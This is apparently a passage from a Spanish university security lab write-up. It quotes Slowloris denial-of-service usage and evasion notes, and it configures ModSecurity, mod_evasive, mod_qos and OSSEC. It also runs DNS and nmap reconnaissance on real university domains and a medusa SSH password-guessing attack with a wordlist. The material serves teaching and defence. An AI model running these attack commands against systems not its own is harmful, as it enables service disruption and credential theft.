Slowloris does support cache avoidance on an experimental basis with the -cache switch.  Some caching servers may look at the request path part of the header, but by sending different requests each time you can abuse more resources.  The usefulness of this particular option has not been thoroughly tested.  Your mileage may vary.

=head3 HTTP Cache Example:

./slowloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -cache

=head1 Issues

Slowloris is known to not work on several servers found in the NOT AFFECTED section above and through Netscalar devices, in it's current incarnation.  They may be ways around this, but not in this version at this time.  Most likely most anti-DDoS and load balancers won't be thwarted by Slowloris, unless Slowloris is extremely distrubted, although only Netscalar has been tested.

Slowloris isn't completely quiet either, because it can't be.  Firstly, it does send out quite a few packets (although far far less than a typical GET request flooder).  So it's not invisible if the traffic to the site is typically fairly low.  On higher traffic sites it will unlikely that it is noticed in the log files - although you may have trouble taking down a larger site with just one machine, depending on their architecture.

For some reason Slowloris works way better if run from a *Nix box than from Windows.  I would guess that it's probably to do with the fact that Windows limits the amount of open sockets you can have at once to a fairly small number.  If you find that you can't open any more ports than ~130 or so on any server you test - you're probably running into this "feature" of modern operating systems.  Either way, this program seems to work best if run from FreeBSD.

Once you stop the DoS all the sockets will naturally close with a flurry of RST and FIN packets, at which time the web server or proxy server will write to it's logs with a lot of 400 (Bad Request) errors.  So while the sockets remain open, you won't be in the logs, but once the sockets close you'll have quite a few entries all lined up next to one another.  You will probably be easy to find if anyone is looking at their logs at that point - although the DoS will be over by that point too.

=head1 What is a slow loris?

What exactly is a slow loris?  It's an extremely cute but endangered mammal that happens to also be poisonous.  Check this out:

http://www.youtube.com/watch?v=rLdQ3UhLoD4
```

### o) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?
Para activar y desactivar un mod:
+ a2enmod 'mod'
+ a2dismod 'mod'

Instalar modsecurity+reglas de OWASP:
+ cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
+ mv crs-setup.conf.example /etc/modsecurity/crs-setup.conf
+ cat /etc/modsecurity/modsecurity.conf
```
# -- Rule engine initialization ----------------------------------------------

# Enable ModSecurity, attaching it to every transaction. Use detection
# only to start with, because that minimises the chances of post-installation
# disruption.
#
SecRuleEngine On  # habilita el motor de reglas de ModSecurity


# -- Request body handling ---------------------------------------------------

# Allow ModSecurity to access request bodies. If you don't, ModSecurity
# won't be able to see any POST parameters, which opens a large security
# hole for attackers to exploit.
#
SecRequestBodyAccess On

...

SecConnEngine On  # habilita el motor de seguimiento de conexiones
SecConnWriteStateLimit 10  # límite en el número de conexiones de escritura 
SecConnReadStateLimit 10  # límite en el número de conexiones de lectura 
```

+ cat /etc/apache2/mods-available/security2.conf
```
<IfModule security2_module>
        # Default Debian dir for modsecurity's persistent data
        SecDataDir /var/cache/modsecurity

        # Include all the *.conf files in /etc/modsecurity.
        # Keeping your local configuration in that directory
        # will allow for an easy upgrade of THIS file and
        # make your life easier
        IncludeOptional /etc/modsecurity/*.conf
        Include /etc/modsecurity/rules/*.conf
        # Include OWASP ModSecurity CRS rules if installed
        #IncludeOptional /usr/share/modsecurity-crs/*.load
</IfModule>
```

Instalar mod_evasive:
+ cat /etc/apache2/mods-available/evasive.conf
```
<IfModule mod_evasive20.c>
    DOSHashTableSize    3097
    DOSPageCount        2
    DOSSiteCount        50
    DOSPageInterval     1
    DOSSiteInterval     1
    DOSBlockingPeriod   120

    #DOSEmailNotify      you@yourdomain.com
    DOSSystemCommand    "su - someuser -c '/sbin/... %s ...'"
    DOSLogDir           "/var/log/mod_evasive"
</IfModule>
```

Instalar mod_qos:
+ cat /etc/apache2/mods-available/qos.conf
```
<IfModule qos_module>
  # minimum request rate (bytes/sec at request reading):
  QS_SrvRequestRate                                 120

  # limits the connections for this virtual host:
  QS_SrvMaxConn                                     100

  # allows keep-alive support till the server reaches 600 connections:
  QS_SrvMaxConnClose                                600

  # allows max 50 connections from a single ip address:
  QS_SrvMaxConnPerIP                                 50
</IfModule>
```

### p) Buscamos información.

##### Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña. 
+ host www.udc.es
```
www.udc.es has address 193.144.53.84
www.udc.es has IPv6 address 2001:720:121c:e000::203

```

+ nslookup www.udc.es
```
Server:         10.8.12.49
Address:        10.8.12.49#53

Non-authoritative answer:
Name:   www.udc.es
Address: 193.144.53.84
Name:   www.udc.es
```
##### Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña. 
+ nslookup -type=ns udc.es
```
Server:         10.8.12.49
Address:        10.8.12.49#53

Non-authoritative answer:
udc.es  nameserver = zipi.udc.es.
udc.es  nameserver = zape.udc.es.
udc.es  nameserver = sun.rediris.es.
udc.es  nameserver = chico.rediris.es.

Authoritative answers can be found from:
zipi.udc.es     internet address = 193.144.48.30
zipi.udc.es     has AAAA address 2001:720:121c:e000::101
zape.udc.es     internet address = 193.144.52.2
zape.udc.es     has AAAA address 2001:720:121c:e000::102
sun.rediris.es  internet address = 199.184.182.1
sun.rediris.es  has AAAA address 2620:171:808::1
chico.rediris.es        internet address = 162.219.54.2
chico.rediris.es        has AAAA address 2620:10a:80eb::2
```

##### ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC. 
+ dig axfr udc.es
```
; <<>> DiG 9.18.19-1~deb12u1-Debian <<>> axfr udc.es
;; global options: +cmd
; Transfer failed.
```

+  nmap -sL 193.144.53.84/20 | grep udc.es
```
Nmap scan report for alvedro1.udc.es (193.144.48.11)
Nmap scan report for alvedro2.udc.es (193.144.48.12)
Nmap scan report for filemon.udc.es (193.144.48.15)
Nmap scan report for mortadelo.udc.es (193.144.48.22)
Nmap scan report for zipi.udc.es (193.144.48.30)
Nmap scan report for pedrido.udc.es (193.144.48.77)
Nmap scan report for zape2.udc.es (193.144.48.100)
Nmap scan report for listas2.udc.es (193.144.48.105)
Nmap scan report for smtp3.udc.es (193.144.48.106)
Nmap scan report for smtp2.udc.es (193.144.48.107)
Nmap scan report for mx2.udc.es (193.144.48.108)
Nmap scan report for listas.udc.es (193.144.48.109)
Nmap scan report for inef130.udc.es (193.144.48.130)
Nmap scan report for inef131.udc.es (193.144.48.131)
Nmap scan report for inef132.udc.es (193.144.48.132)
Nmap scan report for inef133.udc.es (193.144.48.133)
Nmap scan report for inef134.udc.es (193.144.48.134)
Nmap scan report for inef135.udc.es (193.144.48.135)
Nmap scan report for inef136.udc.es (193.144.48.136)
Nmap scan report for inef137.udc.es (193.144.48.137)
Nmap scan report for inef138.udc.es (193.144.48.138)
Nmap scan report for inef139.udc.es (193.144.48.139)
Nmap scan report for inef140.udc.es (193.144.48.140)
Nmap scan report for inef141.udc.es (193.144.48.141)
```

##### ¿Qué gestor de contenidos se utiliza en www.usc.es?
Usa Drupal.
+ whatweb www.usc.es | grep Drupal
```
https://www.usc.gal/gl [200 OK] Apache, Content-Language[gl], Country[UNITED STATES][US], HTML5, HTTPServer[Apache], IP[52.157.220.132], MetaGenerator[Drupal 9 (https://www.drupal.org)], Script[application/json], Strict-Transport-Security[max-age=31536000; includeSubDomains; preload], Title[Inicio | Universidade de Santiago de Compostela], UncommonHeaders[x-content-type-options,link,x-dns-prefetch-control], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

### q) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.
+ nmap -sL 10.11.48.0/23  # Lista
+ nmap -sP 10.11.48.0/23  # Host discovery
+ nmap -sV 10.11.49.49  # Escaneo de servicio
+ nmap -sV -p 22 10.11.49.49  # Escaneo de un servicio concreto

### r) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.
Instalar medusa.
+ cat pass.txt
```
root
ffggg
kkkkk
777777
000000
111
lsi
1234567
1234
user
userlsi
xd
xd2
xd3
FUNCIONA
ez win
```

+ medusa -h 10.11.49.49 -u lsi -P pass.txt -M ssh -n 22

### s) Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un "password guessing".
Instalar OSSEC.

Para activar y parar OSSEC:
+ /var/ossec/bin/ossec-control start
+ /var/ossec/bin/ossec-control stop

Para cambiar el tiempo de baneo:
+ cat  /var/ossec/etc/ossec.conf
```
<!-- Active Response Config -->
  <active-response>
    <!-- This response is going to execute the host-deny
       - command for every event that fires a rule with
       - level (severity) >= 6.
       - The IP is going to be blocked for  600 seconds.
      -->
    <command>host-deny</command>
    <location>local</location>
    <level>6</level>
    <timeout>600</timeout>
  </active-response>

  <active-response>
    <!-- Firewall Drop response. Block the IP for
       - 600 seconds on the firewall (iptables,
       - ipfilter, etc).
      -->
    <command>firewall-drop</command>
    <location>local</location>
    <level>6</level>
    <timeout>600</timeout>
  </active-response>

```

Para ver los logs y las reglas que saltan:
+ tail /var/ossec/logs/active-responses.log

Para desbanear:
+ /var/ossec/active-response/bin/firewall-drop.sh delete - 10.11.49.49
+ /var/ossec/active-response/bin/host-deny.sh delete -10.11.49.49 

### t) Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido ("post mortem"). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.
+ cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a
+ cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a | /var/ossec/bin/ossec-reportd